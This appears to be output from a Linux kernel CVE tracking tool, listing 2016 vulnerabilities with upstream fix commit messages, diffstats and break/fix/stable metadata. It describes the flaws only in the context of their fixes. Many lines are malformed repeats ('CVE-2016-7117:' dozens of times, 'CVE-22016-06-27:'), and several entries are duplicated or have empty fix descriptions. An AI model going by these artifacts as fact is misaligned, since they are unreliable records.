 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
